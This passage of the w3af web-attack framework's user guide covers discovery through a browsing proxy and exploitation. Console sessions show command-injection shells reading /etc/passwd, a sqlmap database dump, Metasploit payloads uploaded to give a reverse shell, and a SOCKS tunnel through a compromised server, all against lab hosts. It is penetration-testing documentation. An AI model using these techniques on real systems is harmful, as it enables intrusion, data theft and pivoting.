enabled textFile and htmlFile output plugins, both will log a vulnerability found by an audit plugin. </p><p class="P21"> </p><h2 class="Heading2"><a name="Complex_sites" />Complex sites</h2><p class="Textbody"> </p><p class="P36">Some sites use embedded objects, like macromedia flash and java applets, that the browser renders to the user. Because of the inability of the framework to get any information out of those objects, a script called spiderMan was born. This script will run a HTTP proxy so the user can navigate the target site through it; during this process the plugin will extract information from the requests and responses. </p><p class="P36">A simple example will clarify things, let's suppose that w3af is auditing a site and can't find any links on the main page. After a closer interpretation of the results by the user, it is clear that the main page has a java applet menu where all the other pages are linked. The user runs w3af once again and now activates the spiderMan plugin, navigates the site manually using the browser and the spiderman proxy. When the user has finished his browsing, w3af will continue with all the hard auditing work. </p><p class="P36">The spiderMan plugin can be used when javascript, flash, java applets or any other browser side technology is present.</p><p class="Textbody">This is a sample spiderMan plugin run: </p><p class="Textbody"> </p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> plugins</p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> discovery spiderMan</p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> discovery</p><p class="P39">Enabled discovery plugins: </p><p class="P39">spiderMan </p><p class="P39"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> back</p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> target</p><p class="P39"><span class="T3">w3af/target&gt;&gt;&gt;</span> set target http://localhost/w3af/fileUpload/</p><p class="P39"><span class="T3">w3af/target&gt;&gt;&gt;</span> back</p><p class="P39"><span class="T3">w3af&gt;&gt;&gt;</span> start</p><p class="P39">To exit spiderMan plugin please navigate to http://w3af/spiderMan?terminate or press ctrl+c . </p><p class="P39">spiderMan running on 127.0.0.1:8998 . </p><p class="P39">spiderMan plugin has been ended by user request. </p><p class="P39"> </p><p class="P23">Now the user configures the browser to use the 127.0.0.1:8998 proxy and navigates the target site, after that he hits ctrl+c and exits the spiderMan. The results are shown: </p><p class="P39"> </p><p class="P39">New URL found by discovery: http://localhost/w3af/test </p><p class="P39">New URL found by discovery: http://localhost/favicon.ico </p><p class="P39">New URL found by discovery: http://localhost/w3af/ </p><p class="P39">New URL found by discovery: http://localhost/w3af/img/w3af.png </p><p class="P39">New URL found by discovery: http://localhost/w3af/xss-forms/test-forms.html </p><p class="P39">New URL found by discovery: http://localhost/w3af/xss-forms/dataReceptor.php </p><p class="P39">The list of found URLs is: </p><p class="P39">- http://localhost/w3af/fileUpload/ </p><p class="P39">- http://localhost/w3af/test </p><p class="P39">- http://localhost/w3af/xss-forms/dataReceptor.php </p><p class="P39">- http://localhost/w3af/</p><p class="P39">- http://localhost/w3af/img/w3af.png </p><p class="P39">- http://localhost/w3af/xss-forms/test-forms.html </p><p class="P39">- http://localhost/w3af/fileUpload/uploader.php </p><p class="P39">- http://localhost/favicon.ico </p><p class="P39">Found 8 URLs and 8 different points of injection. </p><p class="P39">The list of Fuzzable requests is: </p><p class="P39">- http://localhost/w3af/fileUpload/ | Method: GET </p><p class="P39">- http://localhost/w3af/fileUpload/uploader.php | Method: POST | Parameters: (MAX_FILE_SIZE,uploadedfile) </p><p class="P39">- http://localhost/w3af/test | Method: GET </p><p class="P39">- http://localhost/favicon.ico | Method: GET </p><p class="P39">- http://localhost/w3af/ | Method: GET </p><p class="P39">- http://localhost/w3af/img/w3af.png | Method: GET </p><p class="P39">- http://localhost/w3af/xss-forms/test-forms.html | Method: GET </p><p class="P39">- http://localhost/w3af/xss-forms/dataReceptor.php | Method: POST | Parameters: (user,firstname) </p><p class="P39">Starting sqli plugin execution. </p><p class="P42">w3af&gt;&gt;&gt; </p><h2 class="Heading2"><a name="Exploiting" />Exploiting</h2><p class="Textbody"> </p><p class="P36">Two ways of exploiting a vulnerability exist, the first one uses the vulnerabilities found by the audit phase and the second one requires the user to enter the vulnerability parameters, this way is called fastexploit, while the first one is just called exploit.  </p><p class="P36"> </p><p class="P36">Let's see an example of the first way of exploiting a vulnerability with w3af: </p><p class="P36"> </p><p class="P46"><span class="T3">w3af&gt;&gt;&gt;</span> start</p><p class="P46">The list of found URLs is: </p><p class="P46">- http://localhost/w3af/osCommanding/vulnerable.php </p><p class="P46">Found 1 URLs and 1 different points of injection. </p><p class="P46">The list of Fuzzable requests is: </p><p class="P46">- http://localhost/w3af/osCommanding/vulnerable.php | Method: GET | Parameters: (command)</p><p class="P46">Starting osCommanding plugin execution. </p><p class="P46">OS Commanding was found at: http://localhost/w3af/osCommanding/vulnerable.php . Using method: GET. The data sent was: command=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the request with id 2. </p><p class="P46"><span class="T3">w3af&gt;&gt;&gt;</span> exploit</p><p class="P46"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> exploit osCommandingShell</p><p class="P46">osCommanding exploit plugin is starting. </p><p class="P46">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed. </p><p class="P46">Vulnerability successfully exploited. </p><p class="P46">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server. </p><p class="P46"><span class="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> ls</p><p class="P46">vulnerable.php </p><p class="P46">vulnerable.php~ </p><p class="P43">w3af/exploit/osCommandingShell&gt;&gt;&gt; <span class="T9">whoami</span></p><p class="P45">apache </p><p class="P43">w3af/exploit/osCommandingShell&gt;&gt;&gt; </p><p class="P43">w3af/exploit&gt;&gt;&gt; </p><p class="P43">w3af&gt;&gt;&gt; </p><p class="P43"> </p><p class="P52">The second way is to use fastexploit. This method should be used when the user has found a vulnerability manually and wants to exploit it using the framework. Here is an example of a fastexploit run: </p><p class="P52"> </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> exploit</p><p class="P49"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> exploit config sqlmap</p><p class="P49"><span class="T3">w3af/plugin/sqlmap&gt;&gt;&gt; </span>set url http://localhost/w3af/blindSqli/blindSqli-integer.php</p><p class="P49"><span class="T3">w3af/plugin/sqlmap&gt;&gt;&gt;</span> set injvar id</p><p class="P49"><span class="T3">w3af/plugin/sqlmap&gt;&gt;&gt;</span> set data id=1</p><p class="P49"><span class="T3">w3af/plugin/sqlmap&gt;&gt;&gt;</span> back</p><p class="P49"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> fastexploit sqlmap</p><p class="P49">sqlmap coded by inquis &lt;bernardo.damele@gmail.com&gt; and belch &lt;daniele.bellucci@gmail.com&gt;</p><p class="P49">SQL injection could be verified, trying to create the DB driver. </p><p class="P49">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server. </p><p class="P49"><span class="T3">w3af/exploit/sqlmap&gt;&gt;&gt;</span> dump agenda w3af_test</p><p class="P49">Database: w3af_test </p><p class="P49">Table: agenda </p><p class="P49">[2 entries] </p><p class="P49">+---------------+----+--------+----------+-----------------+ </p><p class="P49">| direccion     | id | nombre | telefono | email           |</p><p class="P49">+---------------+----+--------+----------+-----------------+ </p><p class="P49">| direccion 123 | 1  | apr    | 52365786 | acho@c.com      |</p><p class="P49">| direccion 333 | 2  | vico   | 47998123 | vTro@c.com      |</p><p class="P49">+---------------+----+--------+----------+-----------------+ </p><p class="P50">w3af/exploit/sqlmap&gt;&gt;&gt; </p><h3 class="Heading3"><a name="Advanced_exploiting_techniques" />Advanced exploiting techniques</h3><p class="P31"> </p><p class="P32">The framework implements two highly advanced exploiting techniques that allow the user to keep escalating privileges into the remote network. Both of this techniques are used once the framework is able to execute remote operating system commands, this is the case of (for example) osCommanding, remoteFileIncludeShell and davShell attack plugins. These exploiting techniques are: </p><ul style="margin-left:1.25cm;"><li class="P99" style="margin-left:0cm;"><p class="P99" style="margin-left:0.25cm;">Virtual daemon, allows you <span class="T6">to use metasploit payloads to exploit the server that supports a vulnerable web application.</span></p></li><li class="P99" style="margin-left:0cm;"><p class="P99" style="margin-left:0.25cm;">w3afAgent, which creates a tunnel between the compromised server and w3af, the allow the user to route TCP connections through the remote server. </p><p class="P99" style="margin-left:0.25cm;"> </p></li></ul><p class="P32">Both of them are simple to use and configure using this guide. These features are under heavy development and are under no means stable, use them at your on risk. </p><p class="P32"> </p><p class="P32"> </p><h3 class="P35"><a name="Virtual_daemon" />Virtual daemon</h3><p class="P32"> </p><p class="P32">As said before, this feature allows you to use metasploit payloads to exploit the server that supports a vulnerable web application. To use this feature you must have a working installation of the metasploit framework version 3.0 or greater; you can get it for free at <a href="http://www.metasploit.com/">www.metasploit.com</a> , the installation and configuration of MSF is out of the scope of this document.</p><p class="P32">To be able to use the virtual daemon you will need to run the following command in order to copy the w3af metasploit module into the MSF directory: </p><p class="P49">./w3af -i /home/jdoe/tools/msf/ </p><p class="P49"> </p><p class="P34">Where “<span class="T4">/home/jdoe/tools/msf/</span><span class="T6">” is the directory where the user “jdoe” installed Metasploit. I</span>n case you are interested, this is just a fancy shortcut for “<span class="T4">cp core/controllers/vdaemon/w3af_vdaemon.rb /home/user/tools/msf/modules/exploits/unix/misc/</span>”. Once this has been done, the user can start using the virtual daemon feature, before going through an example to see how to use the feature, we will make a summary of the steps that will happened during the exploitation:</p><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P102" style="margin-left:0cm;"><p class="P102" style="margin-left:0.25cm;">w3af finds a vulnerability that allows remote command execution </p></li><li class="P102" style="margin-left:0cm;"><p class="P102" style="margin-left:0.25cm;">The user exploits the vulnerability and starts the virtual daemon </p></li><li class="P102" style="margin-left:0cm;"><p class="P102" style="margin-left:0.25cm;">The user starts the metasploit framework </p></li><li class="P102" style="margin-left:0cm;"><p class="P102" style="margin-left:0.25cm;">The user configures the w3af module inside MSF and executes it </p></li><li class="P102" style="margin-left:0cm;"><p class="P102" style="margin-left:0.25cm;">w3af module inside MSF will connect to the virtual daemon that is listening on localhost </p></li><li class="P102" style="margin-left:0cm;"><p class="P102" style="margin-left:0.25cm;">MSF will send the payload selected by the user to the virtual daemon </p></li><li class="P102" style="margin-left:0cm;"><p class="P102" style="margin-left:0.25cm;">The virtual daemon will create a PE(portable executable) or an ELF(executable and linkable format) file depending on the remote operating system, and using the exploited vulnerability it will upload and execute the payload in the remote server </p></li><li class="P102" style="margin-left:0cm;"><p class="P102" style="margin-left:0.25cm;">The process of uploading the file to the remote server depends on the remote operating system, the privileges of the user running w3af and the local operating system; but in most cases the following happends: </p></li></ol><ul style="margin-left:1.25cm;"><li class="P89" style="margin-left:1.25cm;"><p class="P89" style="margin-left:0.25cm;">w3af sends a small executable to the remote server to perform an extrusion scan. </p></li><li class="P89" style="margin-left:1.25cm;"><p class="P89" style="margin-left:0.25cm;">w3af sniffs on the configured interface ( misc-settings -&gt; interface ) for packets that arrive on the expected ports in order to verify outgoing firewall rules on the remote network </p></li><li class="P93" style="margin-left:1.25cm;"><p class="P93" style="margin-left:0.25cm;"><span class="T6">If a TCP port is found to be allowed in the remote firewall, w3af will try to run a server on that port and make a reverse connection from the </span>compromised host in order to download the PE/ELF generated file.<span class="T6"> If </span><span class="T6">no TCP ports are enabled, w3af will send the ELF/PE file to the remote server using several calls to the “echo” command, which is rather slow, but should always work because it's an in-band transfer method.</span></p></li></ul><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P102" style="margin-left:0cm;"><p class="P102" style="margin-left:0.25cm;">    The payload runs in the remote server and possibly connects back to the metasploit framework, that will handle the rest of the exploitation.</p></li></ol><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P111" style="margin-left:0cm;"><p class="P111" style="margin-left:0.25cm;"> </p></li></ol><p class="P32">Now that we know the theory, let's see an example of what this feature can do: </p><p class="P49"><span class="T3">$</span> ./w3af </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> plugins </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> plugins </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit osCommanding </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit </p><p class="P49">Enabled audit plugins:  </p><p class="P49">osCommanding  </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> back </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> target </p><p class="P49"><span class="T3">w3af/target&gt;&gt;&gt;</span> set target http://172.16.1.128/os.php?cmd=f00 </p><p class="P49"><span class="T3">w3af/target&gt;&gt;&gt;</span> back </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> start </p><p class="P49">The list of found URLs is:  </p><p class="P49">- http://172.16.1.128/os.php  </p><p class="P49">Found 1 URLs and 1 different points of injection.  </p><p class="P49">The list of Fuzzable requests is:  </p><p class="P49">- http://172.16.1.128/os.php | Method: GET | Parameters: (cmd)  </p><p class="P49">Starting osCommanding plugin execution.  </p><p class="P49">OS Commanding was found at: http://172.16.1.128/os.php . Using method: GET. The data sent was: cmd=type+%25SYSTEMROOT%25%5Cwin.ini The vulnerability was found in the request with id 7.  </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> exploit </p><p class="P49"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> exploit osCommandingShell </p><p class="P49">osCommanding exploit plugin is starting.  </p><p class="P49">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P49">Vulnerability successfully exploited.  </p><p class="P49">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server. </p><p class="P49"><span class="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> <span class="T3">start vdaemon </span></p><p class="P49">Virtual daemon service is running on port 9091, use metasploit's w3af_vdaemon module to exploit it.  </p><p class="P50">w3af/exploit/osCommandingShell&gt;&gt;&gt;  </p><p class="P50"> </p><p class="P34">Nothing special for now, just added the new “<span class="T5">start vdaemon</span>” command. With this w3af run we have covered items 1. and 2. of the theory. The next step is to configure the MSF module and run it; my preferred way is to use metasploit's web interface “msfweb”. The first step is to click on the “Exploit” button on the main menu, a small window will appear, there you should search for <span class="T1">w3af </span>and then select the exploit named: “w3af virtual daemon exploit”. Some important points to have in mind while configuring the w3af agent virtual daemon module inside MSF:</p><ul style="margin-left:1.25cm;"><li class="P112" style="margin-left:0cm;"><p class="P112" style="margin-left:0.25cm;">The target is of course the remote operating system you are exploiting </p></li><li class="P112" style="margin-left:0cm;"><p class="P112" style="margin-left:0.25cm;">VNC payloads don't seem to work </p></li><li class="P112" style="margin-left:0cm;"><p class="P112" style="margin-left:0.25cm;">RHOST parameter indicates the IP address of the server you are exploiting </p></li><li class="P112" style="margin-left:0cm;"><p class="P112" style="margin-left:0.25cm;">LHOST is your public IP address </p></li><li class="P112" style="margin-left:0cm;"><p class="P112" style="margin-left:0.25cm;">LPORT is a port where the remote web server can connect to (when using reverse connect payloads) or you can connect to ( when using bind payloads ) </p></li><li class="P112" style="margin-left:0cm;"><p class="P112" style="margin-left:0.25cm;">The w3af module inside metasploit will connect to localhost:9091 and do all the payload transfer, this parameters can't be configured and must not be confused with RHOST/LHOST and LPORT </p></li></ul><p class="P32"> </p><p class="P32">Once it has been configured, we can click on “Launch Exploit” to start the process, this is what we will see in the w3af console: </p><p class="P32"> </p><p class="P49"><span class="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> </p><p class="P49">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P49">The extrusion test failed, no reverse connect transfer methods can be used. Trying inband echo transfer method.  </p><p class="P49">Error: The user running w3af can't sniff on the specified interface. Hints: Are you root? Does this interface exist?  </p><p class="P49">Successfully transfered the MSF payload to the remote server.  </p><p class="P49">Successfully executed the MSF payload on the remote server.  </p><p class="P49"> </p><p class="P34"><span class="T6">The last messages are printed when you run w3af as a normal user, the reason is simple, when you run w3af as a user you can't sniff and </span>therefore<span class="T6"> can't perform a </span><span class="T6">successful extrusion scan. A successful extrusion scan would look like:</span></p><p class="P32"> </p><p class="P49">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P49">ExtrusionServer listening on interface: eth1 </p><p class="P49">Finished extrusion scan.  </p><p class="P49">The remote host: "172.10.10.1" can connect to w3af with these ports:  </p><p class="P49">- 25/TCP  </p><p class="P49">- 80/TCP  </p><p class="P49">- 53/TCP  </p><p class="P49">- 1433/TCP  </p><p class="P49">- 8080/TCP  </p><p class="P49">- 53/UDP  </p><p class="P49">- 69/UDP  </p><p class="P49">- 139/UDP  </p><p class="P49">- 1025/UDP  </p><p class="P49">The following ports are not bound to a local process and can be used by w3af:  </p><p class="P49">- 25/TCP  </p><p class="P49">- 53/TCP  </p><p class="P49">- 1433/TCP  </p><p class="P49">- 8080/TCP  </p><p class="P33">Selecting port "8080/TCP" for inbound connections from the compromised server to w3af.  </p><p class="P33"> </p><p class="P32">And if we take a look at the metasploit web interface we will find something far more interesting: </p><p class="P33"> </p><p class="P49">[*] Started reverse handler  </p><p class="P49">[*] The remote IP address is: 172.16.1.128  </p><p class="P49">[*] Using remote IP address to create payloads.  </p><p class="P49">[*] Sent payload to vdaemon.  </p><p class="P49">[*] The estimated time to wait for the extrusion scan to complete is: 1 seconds. </p><p class="P49">[*] Done waiting!  </p><p class="P49">[*] The estimated time to wait for PE/ELF transfer is: 8 seconds.  </p><p class="P49">[*] Waiting...  </p><p class="P49">[*] Done waiting!  </p><p class="P49">[*] Going to wait for 27 seconds (waiting for crontab/at to execute payload).  </p><p class="P49">[*] The session could start before the handler, so please *be patient*.  </p><p class="P49">[*] Command shell session 1 opened (172.16.1.1:4444 -&gt; 172.16.1.128:1047)  </p><p class="P49">[*] Done waiting!  </p><p class="P49">[*] Starting handler  </p><ol style="margin-left:1.25cm;list-style-type:upper-roman; "><li class="P126" style="margin-left:0cm;"><p class="P126" style="margin-left:0.25cm;">Microsoft Windows 2000 [Version 5.00.2195]  </p><p class="P126" style="margin-left:0.25cm;">(C) Copyright 1985-2000 Microsoft Corp. </p><p class="P94" style="margin-left:0.25cm;"> </p><p class="P126" style="margin-left:0.25cm;">C:\WINNT\system32&gt; </p></li></ol><p class="P32"> </p><p class="P32">Now the user has an interactive shell with the privileges of the user running the web server, that can be used without any restrictions, you could even close w3af now and continue working directly from the metasploit shell. </p><p class="P32"> </p><h3 class="P35"><a name="w3afAgent" />w3afAgent</h3><p class="P32"> </p><p class="P32">As said before, this feature allows you to create a reverse tunnel that will route TCP connections through the compromised server. Unlike virtual daemon, these feature is ready to use and doesn't require any other software. B<span class="T6">efore going through an example to see how to use this feature, we will make a summary of the steps that will happened during exploitation:</span></p><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P118" style="margin-left:0cm;"><p class="P118" style="margin-left:0.25cm;">w3af finds a vulnerability that allows remote command execution </p></li><li class="P118" style="margin-left:0cm;"><p class="P118" style="margin-left:0.25cm;">The user exploits the vulnerability and starts the w3afAgent </p></li><li class="P118" style="margin-left:0cm;"><p class="P118" style="margin-left:0.25cm;">w3af performs an extrusion scan by sending a small executable to the remote server. This executable connects back to w3af and allows the framework to identify outgoing firewall rules on the remote network. </p></li><li class="P118" style="margin-left:0cm;"><p class="P118" style="margin-left:0.25cm;">w3afAgent Manager will send a w3afAgentClient to the remote server. <span class="T6">The </span><span class="T6">process of uploading the file to the remote server depends on the remote operating system, the privileges of the user running w3af and the local </span><span class="T6">operating system; but in most cases the following happends:</span></p></li></ol><ul style="margin-left:1.25cm;"><li class="P91" style="margin-left:1.25cm;"><p class="P91" style="margin-left:0.25cm;">w3af reuses the information from the first extrusion scan, which was performed in step 3 in order to know which port it can use to listen for connections from the compromised server. </p></li><li class="P91" style="margin-left:1.25cm;"><p class="P91" style="margin-left:0.25cm;">If a TCP port is found to be allowed in the remote firewall, w3af will try to run a server on that port and make a reverse connection from the compromised in order to download the PE/ELF generated file. If no TCP ports are enabled, w3af will send the ELF/PE file to the remote server using several calls to the “echo” command, which is rather slow, but should always work because it's an in-band transfer method. </p></li></ul><ol style="margin-left:1.25cm;list-style-type:decimal; "><li class="P118" style="margin-left:0cm;"><p class="P118" style="margin-left:0.25cm;">w3afAgent Manager starts the w3afAgentServer that will bind on localhost:1080 (which will be used by the w3af user) and on the interface configured in w3af ( misc-settings-&gt;interface ) on the port discovered during step 3. </p></li><li class="P118" style="margin-left:0cm;"><p class="P118" style="margin-left:0.25cm;">The w3afAgentClient connects back to the w3afAgentServer, successfully creating the tunnel </p></li><li class="P118" style="margin-left:0cm;"><p class="P118" style="margin-left:0.25cm;">The user configures the proxy listening on localhost:1080 on his preferred software </p></li><li class="P118" style="margin-left:0cm;"><p class="P118" style="margin-left:0.25cm;">When the program connects to the socks proxy, all outgoing connections are routed through the compromised server </p></li></ol><p class="P32"> </p><p class="P32">Now that we know the theory, let's see an example of what this feature can do: </p><p class="P49"><span class="T3">$</span> ./w3af</p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> plugins </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit osCommanding </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> audit </p><p class="P49">Enabled audit plugins:  </p><p class="P49">osCommanding  </p><p class="P49"><span class="T3">w3af/plugins&gt;&gt;&gt;</span> back </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> target </p><p class="P49"><span class="T3">w3af/target&gt;&gt;&gt;</span> set target http://172.10.10.1/w3af/v.php?c=list </p><p class="P49"><span class="T3">w3af/target&gt;&gt;&gt;</span> back </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> start </p><p class="P49">The list of found URLs is:  </p><p class="P49">- <span class="T4">http://172.10.10.1/w3af/v.php</span> </p><p class="P49">Found 1 URLs and 1 different points of injection.  </p><p class="P49">The list of Fuzzable requests is: </p><p class="P49">- <span class="T4">http://172.10.10.1/w3af/v.php</span> | Method: GET | Parameters: (c) </p><p class="P49">Starting osCommanding plugin execution.  </p><p class="P49">OS Commanding was found at: <span class="T4">http://172.10.10.1/w3af/v.php</span> . Using method: GET. The data sent was: c=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the request with id 2. </p><p class="P49"><span class="T3">w3af&gt;&gt;&gt;</span> exploit </p><p class="P49"><span class="T3">w3af/exploit&gt;&gt;&gt;</span> exploit osCommandingShell </p><p class="P49">osCommanding exploit plugin is starting.  </p><p class="P49">The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.  </p><p class="P49">Vulnerability successfully exploited.  </p><p class="P49">Execute "exitPlugin" to get out of the remote shell. Commands typed in this menu will be runned on the remote web server.  </p><p class="P49"> </p><p class="P32">Nothing really new until now, we configured w3af, started the scan and exploited the vulnerability. </p><p class="P49"> </p><p class="P49"><span class="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</span> <span class="T3">start w3afAgent </span></p><p class="P49">Initializing w3afAgent system, please wait.  </p><p class="P49">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P49">The extrusion scan failed.  </p><p class="P49">Error: The user running w3af can't sniff on the specified interface. Hints: Are you root? Does this interface exist?  </p><p class="P49">Using inbound port "5060" without knowing if the remote host will be able to connect back.  </p><p class="P49"> </p><p class="P32">The last messages are printed when you run w3af as a normal user, the reason is simple, when you run w3af as a user you can't sniff and therefor can't perform a successful extrusion scan. A successful extrusion scan would look like: </p><p class="P32"> </p><p class="P49">Please wait some seconds while w3af performs an extrusion scan.  </p><p class="P49">ExtrusionServer listening on interface: eth1 </p><p class="P49">Finished extrusion scan.  </p><p class="P49">The remote host: "172.10.10.1" can connect to w3af with these ports:  </p><p class="P49">- 25/TCP </p><p class="P49">- 80/TCP  </p><p class="P49">- 53/TCP  </p><p class="P49">- 1433/TCP  </p><p class="P49">- 8080/TCP  </p><p class="P49">- 53/UDP  </p><p class="P49">- 69/UDP  </p><p class="P49">- 139/UDP  </p><p class="P49">- 1025/UDP  </p><p class="P49">The following ports are not bound to a local process and can be used by w3af:  </p><p class="P49">- 25/TCP  </p><p class="P49">- 53/TCP  </p><p class="P49">- 1433/TCP  </p><p class="P49">- 8080/TCP  </p><p class="P49">Selecting port "8080/TCP" for inbound connections from the compromised server to w3af.  </p><p class="P49"> </p><p class="P32">In both cases (superuser and user), these should be the following steps: </p><p class="P49"> </p><p class="P49">Starting w3afAgentClient upload.  </p><p class="P49">Finished w3afAgentClient upload.  </p><p class="P49">Please wait 30 seconds for w3afAgentClient execution.  </p><p class="P49">w3afAgent service is up and running.  </p><p class="P49">You may start using the w3afAgent that is listening on port 1080. All connections made through this SOCKS daemon will be relayed using the compromised server.  </p><p class="P49"> </p><p class="P32">And now, from another console we can use a socksClient to route connections through the compromised server: </p><p class="P32"> </p><p class="P49"><span class="T3">$</span> nc <span class="T4">172.10.10.1 22</span></p><p class="P49">(UNKNOWN) [172.10.10.1] 22 (ssh) : Connection refused  </p><p class="P49"> </p><p class="P49"><span class="T3">$</span> python socksClient.py 127.0.0.1 22</p><p class="P49">SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1  </p><p class="P49">Protocol mismatch.  </p><p class="P49"> </p><p class="P49"><span class="T3">$</span> cat socksClient.py</p><p class="P49">import extlib.socksipy.socks as socks  </p><p class="P49">import sys  </p><p class="P49"> </p><p class="P49">s = socks.socksocket()  </p><p class="P49">s.setproxy(socks.PROXY_TYPE_SOCKS4,"localhost")  </p><p class="P49">s.connect((sys.argv[1],int(sys.argv[2])))  </p><p class="P49"> </p><p class="P49">s.send('\n')  </p><p class="P49">print s.recv(1024)  </p><p class="P49"> </p><p class="P33"> </p><h2 class="P55"><a name="More_information" />More information</h2><p class="P15"> </p><p class="P15">More information about the framework, ( usage, bugs, TODO list and news ) can be found in the project homepage: </p><p class="P47"><a href="http://w3af.sf.net/">http://w3af.sf.net/</a> .</p><p class="P15"> </p><p class="P15">I have also created two mailing lists, one for developers and one for users, both are public. The URL for the mailing lists is:  </p><p class="P47"><a href="http://sourceforge.net/mail/?group_id=170274">http://sourceforge.net/mail/?group_id=170274</a></p><p class="P24"> </p><h2 class="Heading2"><a name="Bugs" />Bugs</h2><p class="Textbody"> </p><p class="P36">The framework is still under development and has <span class="T1">many</span> known ( and unknown of course! ) bugs. Code contribution is welcome, a plugin developer guide will be written shortly to aid new developers enter the w3af world. For a list of known bugs and a TODO list, please see:</p><p class="P36"> </p><p class="P48"><a href="http://sourceforge.net/pm/?group_id=170274">http://sourceforge.net/pm/?group_id=170274</a></p><p class="P48"> </p><h2 class="P28"><a name="Final_words" />Final words</h2><p class="Textbody"> </p><p class="P36">This document is merely and introduction, complete knowledge about the framework and its usage is complex and can be achieved only by using it. </p><p class="P36"> </p><p class="P36">Making a mistake and learning from it, takes you one step closer to wisdom. </p></body></html>